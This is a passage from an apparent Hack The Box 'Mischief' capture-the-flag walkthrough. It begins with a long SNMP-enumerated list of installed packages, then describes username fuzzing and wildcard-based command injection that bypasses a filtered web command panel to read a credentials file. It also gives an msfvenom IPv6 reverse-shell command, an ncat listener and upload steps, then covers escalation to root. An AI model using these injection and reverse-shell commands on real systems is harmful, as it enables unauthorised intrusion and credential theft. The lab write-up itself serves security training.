|   libparted2-3.2-20; 0-01-01T00:00:00
|   libpcap0.8-1.8.1-6ubuntu1; 0-01-01T00:00:00
|   libpci3-1:3.5.2-1ubuntu1; 0-01-01T00:00:00
|   libpcre3-2:8.39-9; 0-01-01T00:00:00
|   libperl5.26-5.26.1-6; 0-01-01T00:00:00
|   libpipeline1-1.5.0-1; 0-01-01T00:00:00
|   libplymouth4-0.9.3-1ubuntu7; 0-01-01T00:00:00
|   libpng16-16-1.6.34-1; 0-01-01T00:00:00
|   libpolkit-agent-1-0-0.105-20; 0-01-01T00:00:00
|   libpolkit-backend-1-0-0.105-20; 0-01-01T00:00:00
|   libpolkit-gobject-1-0-0.105-20; 0-01-01T00:00:00
|   libpopt0-1.16-11; 0-01-01T00:00:00
|   libprocps6-2:3.3.12-3ubuntu1; 0-01-01T00:00:00
|   libpsl5-0.19.1-5build1; 0-01-01T00:00:00
|   libpython-all-dev-2.7.15~rc1-1; 0-01-01T00:00:00
|   libpython-dev-2.7.15~rc1-1; 0-01-01T00:00:00
|   libpython-stdlib-2.7.15~rc1-1; 0-01-01T00:00:00
|   libpython2.7-2.7.15~rc1-1; 0-01-01T00:00:00
|   libpython2.7-dev-2.7.15~rc1-1; 0-01-01T00:00:00
|   libpython2.7-minimal-2.7.15~rc1-1; 0-01-01T00:00:00
|   libpython2.7-stdlib-2.7.15~rc1-1; 0-01-01T00:00:00
|   libpython3-stdlib-3.6.5-3; 0-01-01T00:00:00
|   libpython3.6-3.6.5-3; 0-01-01T00:00:00
|   libpython3.6-minimal-3.6.5-3; 0-01-01T00:00:00
|   libpython3.6-stdlib-3.6.5-3; 0-01-01T00:00:00
|   libquadmath0-8-20180414-1ubuntu2; 0-01-01T00:00:00
|   libreadline5-5.2+dfsg-3build1; 0-01-01T00:00:00
|   libreadline7-7.0-3; 0-01-01T00:00:00
|   libroken18-heimdal-7.5.0+dfsg-1; 0-01-01T00:00:00
|   librtmp1-2.4+20151223.gitfa8646d.1-1; 0-01-01T00:00:00
|   libsasl2-2-2.1.27~101-g0780600+dfsg-3ubuntu2; 0-01-01T00:00:00
|   libsasl2-modules-2.1.27~101-g0780600+dfsg-3ubuntu2; 0-01-01T00:00:00
|   libsasl2-modules-db-2.1.27~101-g0780600+dfsg-3ubuntu2; 0-01-01T00:00:00
|   libseccomp2-2.3.1-2.1ubuntu4; 0-01-01T00:00:00
|   libselinux1-2.7-2build2; 0-01-01T00:00:00
|   libsemanage-common-2.7-2build2; 0-01-01T00:00:00
|   libsemanage1-2.7-2build2; 0-01-01T00:00:00
|   libsensors4-1:3.4.0-4; 0-01-01T00:00:00
|   libsepol1-2.7-1; 0-01-01T00:00:00
|   libsigsegv2-2.12-1; 0-01-01T00:00:00
|   libslang2-2.3.1a-3ubuntu1; 0-01-01T00:00:00
|   libsmartcols1-2.31.1-0.4ubuntu3; 0-01-01T00:00:00
|   libsnmp-base-5.7.3+dfsg-1.8ubuntu3; 0-01-01T00:00:00
|   libsnmp30-5.7.3+dfsg-1.8ubuntu3; 0-01-01T00:00:00
|   libsodium23-1.0.16-2; 0-01-01T00:00:00
|   libsqlite3-0-3.22.0-1; 0-01-01T00:00:00
|   libss2-1.44.1-1; 0-01-01T00:00:00
|   libssl1.0.0-1.0.2n-1ubuntu5; 0-01-01T00:00:00
|   libssl1.1-1.1.0g-2ubuntu4; 0-01-01T00:00:00
|   libstdc++-7-dev-7.3.0-16ubuntu3; 0-01-01T00:00:00
|   libstdc++6-8-20180414-1ubuntu2; 0-01-01T00:00:00
|   libsystemd0-237-3ubuntu10; 0-01-01T00:00:00
|   libtasn1-6-4.13-2; 0-01-01T00:00:00
|   libtext-charwidth-perl-0.04-7.1; 0-01-01T00:00:00
|   libtext-iconv-perl-1.7-5build6; 0-01-01T00:00:00
|   libtext-wrapi18n-perl-0.06-7.1; 0-01-01T00:00:00
|   libtimedate-perl-2.3000-2; 0-01-01T00:00:00
|   libtinfo5-6.1-1ubuntu1; 0-01-01T00:00:00
|   libtsan0-8-20180414-1ubuntu2; 0-01-01T00:00:00
|   libubsan0-7.3.0-16ubuntu3; 0-01-01T00:00:00
|   libudev1-237-3ubuntu10; 0-01-01T00:00:00
|   libunistring2-0.9.9-0ubuntu1; 0-01-01T00:00:00
|   libunwind8-1.2.1-8; 0-01-01T00:00:00
|   liburi-perl-1.73-1; 0-01-01T00:00:00
|   libusb-1.0-0-2:1.0.21-2; 0-01-01T00:00:00
|   libutempter0-1.1.6-3; 0-01-01T00:00:00
|   libuuid1-2.31.1-0.4ubuntu3; 0-01-01T00:00:00
|   libwind0-heimdal-7.5.0+dfsg-1; 0-01-01T00:00:00
|   libwrap0-7.6.q-27; 0-01-01T00:00:00
|   libx11-6-2:1.6.4-3; 0-01-01T00:00:00
|   libx11-data-2:1.6.4-3; 0-01-01T00:00:00
|   libxau6-1:1.0.8-1; 0-01-01T00:00:00
|   libxcb1-1.13-1; 0-01-01T00:00:00
|   libxdmcp6-1:1.1.2-3; 0-01-01T00:00:00
|   libxext6-2:1.3.3-1; 0-01-01T00:00:00
|   libxml2-2.9.4+dfsg1-6.1ubuntu1; 0-01-01T00:00:00
|   libxmlsec1-1.2.25-1build1; 0-01-01T00:00:00
|   libxmlsec1-openssl-1.2.25-1build1; 0-01-01T00:00:00
|   libxmuu1-2:1.1.2-2; 0-01-01T00:00:00
|   libxslt1.1-1.1.29-5; 0-01-01T00:00:00
|   libxtables12-1.6.1-2ubuntu2; 0-01-01T00:00:00
|   libyaml-0-2-0.1.7-2ubuntu3; 0-01-01T00:00:00
|   libzstd1-1.3.3+dfsg-2ubuntu1; 0-01-01T00:00:00
|   linux-base-4.5ubuntu1; 0-01-01T00:00:00
|   linux-firmware-1.173; 0-01-01T00:00:00
|   linux-generic-4.15.0.20.23; 0-01-01T00:00:00
|   linux-headers-4.15.0-20-4.15.0-20.21; 0-01-01T00:00:00
|   linux-headers-4.15.0-20-generic-4.15.0-20.21; 0-01-01T00:00:00
|   linux-headers-generic-4.15.0.20.23; 0-01-01T00:00:00
|   linux-image-4.15.0-20-generic-4.15.0-20.21; 0-01-01T00:00:00
|   linux-image-generic-4.15.0.20.23; 0-01-01T00:00:00
|   linux-libc-dev-4.15.0-20.21; 0-01-01T00:00:00
|   linux-modules-4.15.0-20-generic-4.15.0-20.21; 0-01-01T00:00:00
|   linux-modules-extra-4.15.0-20-generic-4.15.0-20.21; 0-01-01T00:00:00
|   linux-signed-generic-4.15.0.20.23; 0-01-01T00:00:00
|   locales-2.27-3ubuntu1; 0-01-01T00:00:00
|   login-1:4.5-1ubuntu1; 0-01-01T00:00:00
|   logrotate-3.11.0-0.1ubuntu1; 0-01-01T00:00:00
|   lsb-base-9.20170808ubuntu1; 0-01-01T00:00:00
|   lsb-release-9.20170808ubuntu1; 0-01-01T00:00:00
|   lshw-02.18-0.1ubuntu6; 0-01-01T00:00:00
|   lsof-4.89+dfsg-0.1; 0-01-01T00:00:00
|   ltrace-0.7.3-6ubuntu1; 0-01-01T00:00:00
|   lvm2-2.02.176-4.1ubuntu3; 0-01-01T00:00:00
|   lxcfs-3.0.0-0ubuntu1; 0-01-01T00:00:00
|   lxd-client-3.0.0-0ubuntu4; 0-01-01T00:00:00
|   make-4.1-9.1ubuntu1; 0-01-01T00:00:00
|   man-db-2.8.3-2; 0-01-01T00:00:00
|   manpages-4.15-1; 0-01-01T00:00:00
|   manpages-dev-4.15-1; 0-01-01T00:00:00
|   mawk-1.3.3-17ubuntu3; 0-01-01T00:00:00
|   mdadm-4.0-2ubuntu1; 0-01-01T00:00:00
|   mime-support-3.60ubuntu1; 0-01-01T00:00:00
|   mlocate-0.26-2ubuntu3.1; 0-01-01T00:00:00
|   mount-2.31.1-0.4ubuntu3; 0-01-01T00:00:00
|   mtr-tiny-0.92-1; 0-01-01T00:00:00
|   multiarch-support-2.27-3ubuntu1; 0-01-01T00:00:00
|   mysql-client-5.7-5.7.22-0ubuntu18.04.1; 0-01-01T00:00:00
|   mysql-client-core-5.7-5.7.22-0ubuntu18.04.1; 0-01-01T00:00:00
|   mysql-common-5.8+1.0.4; 0-01-01T00:00:00
|   mysql-server-5.7-5.7.22-0ubuntu18.04.1; 0-01-01T00:00:00
|   mysql-server-5.7.22-0ubuntu18.04.1; 0-01-01T00:00:00
|   mysql-server-core-5.7-5.7.22-0ubuntu18.04.1; 0-01-01T00:00:00
|   nano-2.9.3-2; 0-01-01T00:00:00
|   ncurses-base-6.1-1ubuntu1; 0-01-01T00:00:00
|   ncurses-bin-6.1-1ubuntu1; 0-01-01T00:00:00
|   ncurses-term-6.1-1ubuntu1; 0-01-01T00:00:00
|   net-tools-1.60+git20161116.90da8a0-1ubuntu1; 0-01-01T00:00:00
|   netbase-5.4; 0-01-01T00:00:00
|   netcat-openbsd-1.187-1; 0-01-01T00:00:00
|   netfilter-persistent-1.0.4+nmu2; 0-01-01T00:00:00
|   netplan.io-0.36.1; 0-01-01T00:00:00
|   networkd-dispatcher-1.7-0ubuntu3; 0-01-01T00:00:00
|   nplan-0.36.1; 0-01-01T00:00:00
|   ntfs-3g-1:2017.3.23-2; 0-01-01T00:00:00
|   open-iscsi-2.0.874-5ubuntu2; 0-01-01T00:00:00
|   open-vm-tools-2:10.2.0-3ubuntu3; 0-01-01T00:00:00
|   openssh-client-1:7.6p1-4; 0-01-01T00:00:00
|   openssh-server-1:7.6p1-4; 0-01-01T00:00:00
|   openssh-sftp-server-1:7.6p1-4; 0-01-01T00:00:00
|   openssl-1.1.0g-2ubuntu4; 0-01-01T00:00:00
|   os-prober-1.74ubuntu1; 0-01-01T00:00:00
|   overlayroot-0.40ubuntu1; 0-01-01T00:00:00
|   parted-3.2-20; 0-01-01T00:00:00
|   passwd-1:4.5-1ubuntu1; 0-01-01T00:00:00
|   pastebinit-1.5-2; 0-01-01T00:00:00
|   patch-2.7.6-2ubuntu1; 0-01-01T00:00:00
|   pciutils-1:3.5.2-1ubuntu1; 0-01-01T00:00:00
|   perl-5.26.1-6; 0-01-01T00:00:00
|   perl-base-5.26.1-6; 0-01-01T00:00:00
|   perl-modules-5.26-5.26.1-6; 0-01-01T00:00:00
|   php-1:7.2+60ubuntu1; 0-01-01T00:00:00
|   php-common-1:60ubuntu1; 0-01-01T00:00:00
|   php-mysql-1:7.2+60ubuntu1; 0-01-01T00:00:00
|   php7.2-7.2.5-0ubuntu0.18.04.1; 0-01-01T00:00:00
|   php7.2-cli-7.2.5-0ubuntu0.18.04.1; 0-01-01T00:00:00
|   php7.2-common-7.2.5-0ubuntu0.18.04.1; 0-01-01T00:00:00
|   php7.2-json-7.2.5-0ubuntu0.18.04.1; 0-01-01T00:00:00
|   php7.2-mysql-7.2.5-0ubuntu0.18.04.1; 0-01-01T00:00:00
|   php7.2-opcache-7.2.5-0ubuntu0.18.04.1; 0-01-01T00:00:00
|   php7.2-readline-7.2.5-0ubuntu0.18.04.1; 0-01-01T00:00:00
|   pinentry-curses-1.1.0-1; 0-01-01T00:00:00
|   plymouth-0.9.3-1ubuntu7; 0-01-01T00:00:00
|   plymouth-theme-ubuntu-text-0.9.3-1ubuntu7; 0-01-01T00:00:00
|   policykit-1-0.105-20; 0-01-01T00:00:00
|   pollinate-4.31-0ubuntu1; 0-01-01T00:00:00
|   popularity-contest-1.66ubuntu1; 0-01-01T00:00:00
|   powermgmt-base-1.33; 0-01-01T00:00:00
|   procps-2:3.3.12-3ubuntu1; 0-01-01T00:00:00
|   psmisc-23.1-1; 0-01-01T00:00:00
|   publicsuffix-20180223.1310-1; 0-01-01T00:00:00
|   python-2.7.15~rc1-1; 0-01-01T00:00:00
|   python-all-2.7.15~rc1-1; 0-01-01T00:00:00
|   python-all-dev-2.7.15~rc1-1; 0-01-01T00:00:00
|   python-apt-common-1.6.0; 0-01-01T00:00:00
|   python-asn1crypto-0.24.0-1; 0-01-01T00:00:00
|   python-cffi-backend-1.11.5-1; 0-01-01T00:00:00
|   python-crypto-2.6.1-8ubuntu2; 0-01-01T00:00:00
|   python-cryptography-2.1.4-1ubuntu1.1; 0-01-01T00:00:00
|   python-dbus-1.2.6-1; 0-01-01T00:00:00
|   python-dev-2.7.15~rc1-1; 0-01-01T00:00:00
|   python-enum34-1.1.6-2; 0-01-01T00:00:00
|   python-gi-3.26.1-2; 0-01-01T00:00:00
|   python-idna-2.6-1; 0-01-01T00:00:00
|   python-ipaddress-1.0.17-1; 0-01-01T00:00:00
|   python-keyring-10.6.0-1; 0-01-01T00:00:00
|   python-keyrings.alt-3.0-1; 0-01-01T00:00:00
|   python-minimal-2.7.15~rc1-1; 0-01-01T00:00:00
|   python-pip-9.0.1-2; 0-01-01T00:00:00
|   python-pip-whl-9.0.1-2; 0-01-01T00:00:00
|   python-pkg-resources-39.0.1-2; 0-01-01T00:00:00
|   python-secretstorage-2.3.1-2; 0-01-01T00:00:00
|   python-setuptools-39.0.1-2; 0-01-01T00:00:00
|   python-six-1.11.0-2; 0-01-01T00:00:00
|   python-wheel-0.30.0-0.2; 0-01-01T00:00:00
|   python-xdg-0.25-4ubuntu1; 0-01-01T00:00:00
|   python2.7-2.7.15~rc1-1; 0-01-01T00:00:00
|   python2.7-dev-2.7.15~rc1-1; 0-01-01T00:00:00
|   python2.7-minimal-2.7.15~rc1-1; 0-01-01T00:00:00
|   python3-3.6.5-3; 0-01-01T00:00:00
|   python3-apport-2.20.9-0ubuntu7; 0-01-01T00:00:00
|   python3-apt-1.6.0; 0-01-01T00:00:00
|   python3-asn1crypto-0.24.0-1; 0-01-01T00:00:00
|   python3-attr-17.4.0-2; 0-01-01T00:00:00
|   python3-automat-0.6.0-1; 0-01-01T00:00:00
|   python3-blinker-1.4+dfsg1-0.1; 0-01-01T00:00:00
|   python3-certifi-2018.1.18-2; 0-01-01T00:00:00
|   python3-cffi-backend-1.11.5-1; 0-01-01T00:00:00
|   python3-chardet-3.0.4-1; 0-01-01T00:00:00
|   python3-click-6.7-3; 0-01-01T00:00:00
|   python3-colorama-0.3.7-1; 0-01-01T00:00:00
|   python3-commandnotfound-18.04.4; 0-01-01T00:00:00
|   python3-configobj-5.0.6-2; 0-01-01T00:00:00
|   python3-constantly-15.1.0-1; 0-01-01T00:00:00
|   python3-cryptography-2.1.4-1ubuntu1.1; 0-01-01T00:00:00
|   python3-dbus-1.2.6-1; 0-01-01T00:00:00
|   python3-debconf-1.5.66; 0-01-01T00:00:00
|   python3-debian-0.1.32; 0-01-01T00:00:00
|   python3-distro-info-0.18; 0-01-01T00:00:00
|   python3-distupgrade-1:18.04.17; 0-01-01T00:00:00
|   python3-gdbm-3.6.5-3; 0-01-01T00:00:00
|   python3-gi-3.26.1-2; 0-01-01T00:00:00
|   python3-httplib2-0.9.2+dfsg-1; 0-01-01T00:00:00
|   python3-hyperlink-17.3.1-2; 0-01-01T00:00:00
|   python3-idna-2.6-1; 0-01-01T00:00:00
|   python3-incremental-16.10.1-3; 0-01-01T00:00:00
|   python3-jinja2-2.10-1; 0-01-01T00:00:00
|   python3-json-pointer-1.10-1; 0-01-01T00:00:00
|   python3-jsonpatch-1.19+really1.16-1fakesync1; 0-01-01T00:00:00
|   python3-jsonschema-2.6.0-2; 0-01-01T00:00:00
|   python3-jwt-1.5.3+ds1-1; 0-01-01T00:00:00
|   python3-markupsafe-1.0-1build1; 0-01-01T00:00:00
|   python3-minimal-3.6.5-3; 0-01-01T00:00:00
|   python3-newt-0.52.20-1ubuntu1; 0-01-01T00:00:00
|   python3-oauthlib-2.0.6-1; 0-01-01T00:00:00
|   python3-openssl-17.5.0-1ubuntu1; 0-01-01T00:00:00
|   python3-pam-0.4.2-13.2ubuntu4; 0-01-01T00:00:00
|   python3-pkg-resources-39.0.1-2; 0-01-01T00:00:00
|   python3-problem-report-2.20.9-0ubuntu7; 0-01-01T00:00:00
|   python3-pyasn1-0.4.2-3; 0-01-01T00:00:00
|   python3-pyasn1-modules-0.2.1-0.2; 0-01-01T00:00:00
|   python3-requests-2.18.4-2; 0-01-01T00:00:00
|   python3-requests-unixsocket-0.1.5-3; 0-01-01T00:00:00
|   python3-serial-3.4-2; 0-01-01T00:00:00
|   python3-service-identity-16.0.0-2; 0-01-01T00:00:00
|   python3-six-1.11.0-2; 0-01-01T00:00:00
|   python3-software-properties-0.96.24.32.1; 0-01-01T00:00:00
|   python3-systemd-234-1build1; 0-01-01T00:00:00
|   python3-twisted-17.9.0-2; 0-01-01T00:00:00
|   python3-twisted-bin-17.9.0-2; 0-01-01T00:00:00
|   python3-update-manager-1:18.04.11; 0-01-01T00:00:00
|   python3-urllib3-1.22-1; 0-01-01T00:00:00
|   python3-yaml-3.12-1build2; 0-01-01T00:00:00
|   python3-zope.interface-4.3.2-1build2; 0-01-01T00:00:00
|   python3.6-3.6.5-3; 0-01-01T00:00:00
|   python3.6-minimal-3.6.5-3; 0-01-01T00:00:00
|   readline-common-7.0-3; 0-01-01T00:00:00
|   rsync-3.1.2-2.1ubuntu1; 0-01-01T00:00:00
|   rsyslog-8.32.0-1ubuntu4; 0-01-01T00:00:00
|   run-one-1.17-0ubuntu1; 0-01-01T00:00:00
|   screen-4.6.2-1; 0-01-01T00:00:00
|   sed-4.4-2; 0-01-01T00:00:00
|   sensible-utils-0.0.12; 0-01-01T00:00:00
|   shared-mime-info-1.9-2; 0-01-01T00:00:00
|   snmpd-5.7.3+dfsg-1.8ubuntu3; 0-01-01T00:00:00
|   software-properties-common-0.96.24.32.1; 0-01-01T00:00:00
|   sosreport-3.5-1ubuntu3; 0-01-01T00:00:00
|   ssh-import-id-5.7-0ubuntu1; 0-01-01T00:00:00
|   ssl-cert-1.0.39; 0-01-01T00:00:00
|   strace-4.21-1ubuntu1; 0-01-01T00:00:00
|   sudo-1.8.21p2-3ubuntu1; 0-01-01T00:00:00
|   systemd-237-3ubuntu10; 0-01-01T00:00:00
|   systemd-sysv-237-3ubuntu10; 0-01-01T00:00:00
|   sysvinit-utils-2.88dsf-59.10ubuntu1; 0-01-01T00:00:00
|   tar-1.29b-2; 0-01-01T00:00:00
|   tcpdump-4.9.2-3; 0-01-01T00:00:00
|   telnet-0.17-41; 0-01-01T00:00:00
|   thermald-1.7.0-5ubuntu1; 0-01-01T00:00:00
|   time-1.7-25.1build1; 0-01-01T00:00:00
|   tmux-2.6-3; 0-01-01T00:00:00
|   tzdata-2018d-1; 0-01-01T00:00:00
|   ubuntu-advantage-tools-17; 0-01-01T00:00:00
|   ubuntu-keyring-2018.02.28; 0-01-01T00:00:00
|   ubuntu-minimal-1.417; 0-01-01T00:00:00
|   ubuntu-release-upgrader-core-1:18.04.17; 0-01-01T00:00:00
|   ubuntu-standard-1.417; 0-01-01T00:00:00
|   ucf-3.0038; 0-01-01T00:00:00
|   udev-237-3ubuntu10; 0-01-01T00:00:00
|   ufw-0.35-5; 0-01-01T00:00:00
|   uidmap-1:4.5-1ubuntu1; 0-01-01T00:00:00
|   unattended-upgrades-1.1ubuntu1; 0-01-01T00:00:00
|   unzip-6.0-21ubuntu1; 0-01-01T00:00:00
|   update-manager-core-1:18.04.11; 0-01-01T00:00:00
|   update-notifier-common-3.192.1; 0-01-01T00:00:00
|   ureadahead-0.100.0-20; 0-01-01T00:00:00
|   usbutils-1:007-4build1; 0-01-01T00:00:00
|   util-linux-2.31.1-0.4ubuntu3; 0-01-01T00:00:00
|   uuid-runtime-2.31.1-0.4ubuntu3; 0-01-01T00:00:00
|   vim-2:8.0.1453-1ubuntu1; 0-01-01T00:00:00
|   vim-common-2:8.0.1453-1ubuntu1; 0-01-01T00:00:00
|   vim-runtime-2:8.0.1453-1ubuntu1; 0-01-01T00:00:00
|   vim-tiny-2:8.0.1453-1ubuntu1; 0-01-01T00:00:00
|   wget-1.19.4-1ubuntu2.1; 0-01-01T00:00:00
|   whiptail-0.52.20-1ubuntu1; 0-01-01T00:00:00
|   wireless-regdb-2016.06.10-0ubuntu1; 0-01-01T00:00:00
|   xauth-1:1.0.10-1; 0-01-01T00:00:00
|   xdelta3-3.0.11-dfsg-1ubuntu1; 0-01-01T00:00:00
|   xdg-user-dirs-0.17-1ubuntu1; 0-01-01T00:00:00
|   xfsprogs-4.9.0+nmu1ubuntu2; 0-01-01T00:00:00
|   xkb-data-2.23.1-1ubuntu1; 0-01-01T00:00:00
|   xxd-2:8.0.1453-1ubuntu1; 0-01-01T00:00:00
|   xz-utils-5.2.2-1.3; 0-01-01T00:00:00
|   zerofree-1.0.4-1; 0-01-01T00:00:00
|_  zlib1g-1:1.2.11.dfsg-0ubuntu2; 0-01-01T00:00:00
```

Awesome. The credential is (`loki:godofmischiefisloki`). Of course! Who else is more mischievous.

<a class="image-popup">
![c867251d.png](/assets/images/posts/mischief-htb-walkthrough/c867251d.png)
</a>

Notice in the SNMP enumeration, Apache is running but we can't access it? It must be listening on an IPv6 address but what is the address?

Using a simple SNMP IPv6 enumerator [script](https://github.com/trickster0/Enyx) written by the creator, we can get the IPv6 address.

<a class="image-popup">
![df3265e2.png](/assets/images/posts/mischief-htb-walkthrough/df3265e2.png)
</a>

Another attack surface emerges.

<a class="image-popup">
![a702ec85.png](/assets/images/posts/mischief-htb-walkthrough/a702ec85.png)
</a>

Recall the two credentials from earlier? The second password is valid but not the username. I fuzz the username with `wfuzz` and the top-short usernames from SecLists.

<a class="image-popup">
![c0d12b08.png](/assets/images/posts/mischief-htb-walkthrough/c0d12b08.png)
</a>

Log in with the credentials (`administrator:trickeryanddeceit`).

<a class="image-popup">
![b3af2bd7.png](/assets/images/posts/mischief-htb-walkthrough/b3af2bd7.png)
</a>

## Low-Privilege Shell

What you see here is a remote command execution panel. Suffice to say, certain commands and paths are forbidden. Combined with shell wildcards such as asterisk `*` and question mark `?`, for zero or more characters and single character respectively, we are able to tease out the location of the file and display it in `base64` no less.

_List directories and files with `ls`_

```
/bin/?s -la /home/loki; ping -c 2 127.0.0.1
```

<a class="image-popup">
![48adf3f6.png](/assets/images/posts/mischief-htb-walkthrough/48adf3f6.png)
</a>

_Display `/home/loki/credentials` with `base64`_

```
base64 /home/loki/c*; ping -c 2 127.0.0.1
```

<a class="image-popup">
![760d7808.png](/assets/images/posts/mischief-htb-walkthrough/760d7808.png)
</a>

The password is decoded like so.

<a class="image-popup">
![f06d6f02.png](/assets/images/posts/mischief-htb-walkthrough/f06d6f02.png)
</a>

Time to claim our low-privilege shell.

<a class="image-popup">
![4d26a8fd.png](/assets/images/posts/mischief-htb-walkthrough/4d26a8fd.png)
</a>

The user flag is here.

<a class="image-popup">
![b6af45dd.png](/assets/images/posts/mischief-htb-walkthrough/b6af45dd.png)
</a>

## Privilege Escalation

During enumeration of `loki`'s account, you'll notice that `loki` is stripped off `execute` rights with File Access Control List (ACL) for `su` and `sudo` but not the rest of the users. Look around, what other users are there?

<a class="image-popup">
![3023836a.png](/assets/images/posts/mischief-htb-walkthrough/3023836a.png)
</a>

<a class="image-popup">
![e2ca0b8b.png](/assets/images/posts/mischief-htb-walkthrough/c36d6598.png)
</a>

Recall the Command Execution Panel running off Apache or `www-data` to be exact?

We can upload a reverse shell and execute it to get a shell as `www-data`. We'll use `msfvenom` to generate a reverse shell. Bear in mind, the host has blocked all outgoing IPv4 connections, so we'll have to use a IPv6 reverse shell instead.

```
msfvenom -p linux/x86/shell_reverse_tcp_ipv6 LHOST=dead:beef:2::116a LPORT=1234 -f elf -o rev
```

Conversely, you need to set up an IPv6 listener. You can do that with `ncat`.

```
ncat -6 -lnvp 1234
```

Now, use the Command Execution Panel to upload the reverse shell like so.

```
echo pif0V...ABzYA= | base64 -d >/tmp/rev; ping -c 2 127.0.0.1
```

Make the reverse shell executable.

```
/bin/?hm?d 777 /tmp/rev; ping -c 2 127.0.0.1
```

Finally, execute the reverse shell.

```
/tmp/rev; ping -c 2 127.0.0.1
```

<a class="image-popup">
![0872c4e1.png](/assets/images/posts/mischief-htb-walkthrough/0872c4e1.png)
</a>

Voila, another shell. This time as `www-data`.

If you have done your enumeration thorough enough, you would have notice another password in `loki`'s home directory. This is how it looks like.

<a class="image-popup">
![9bca599e.png](/assets/images/posts/mischief-htb-walkthrough/9bca599e.png)
</a>

Saw the password? At first glance, you might have dismissed it as the first password for the Basic authentication.

Now, let's see if that's the `root` password.

<a class="image-popup">
![95608a01.png](/assets/images/posts/mischief-htb-walkthrough/95608a01.png)
</a>

## What's the Flag?

The trickster is tricky indeed.

<a class="image-popup">
![3c235567.png](/assets/images/posts/mischief-htb-walkthrough/3c235567.png)
</a>

One more command to find the `root` flag.

<a class="image-popup">
![5beff733.png](/assets/images/posts/mischief-htb-walkthrough/5beff733.png)
</a>

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/145
[2]: https://www.hackthebox.eu/home/users/profile/169
[3]: https://www.hackthebox.eu/
